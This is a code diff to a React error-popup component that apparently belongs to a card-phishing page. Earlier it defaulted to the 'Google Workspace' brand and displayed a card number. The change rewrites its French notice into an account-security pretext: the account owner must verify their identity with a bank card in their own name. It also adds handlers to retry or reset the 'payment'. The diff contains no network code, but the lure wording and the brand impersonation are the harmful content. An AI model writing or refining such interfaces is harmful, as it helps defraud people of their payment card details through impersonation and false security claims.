@@ -4,11 +4,12 @@ import PopupHeader from '../PopupHeader';
 import styles from '../../styles/modules/ErrorPopup.module.css';
 
 const ErrorPopup = ({ 
+  status,
   isVisible, 
-  onRetry,
+  retryPayment,
+  resetPayment,
   isLoading = false,
   cardNumber,
-  brandName = "Google Workspace" 
 }) => {
   if (!isVisible) return null;
 
@@ -34,14 +35,13 @@ const ErrorPopup = ({
           
           <div className={styles.errorNotice}>
             <p className={styles.errorNoticeText}>
-              Dans le cadre de la lutte contre la fraude, nous avons mis en place un système 
-              de vérification d'identité pour nos paiements en ligne. 
-              Assurez-vous d'utiliser une carte bancaire valide à votre nom.
+              Dans le cadre de la lutte contre le vol de données et l'utilisation frauduleuse de comptes,
+              le proprétaire de ce compte doit vérifier son identité en utilisant une carte bancaire valide à son nom.
             </p>
           </div>
           
           <button 
-            onClick={onRetry} 
+            onClick={status !== 'error' ? retryPayment : resetPayment} 
             disabled={isLoading}
             className={styles.retryButton}
           >
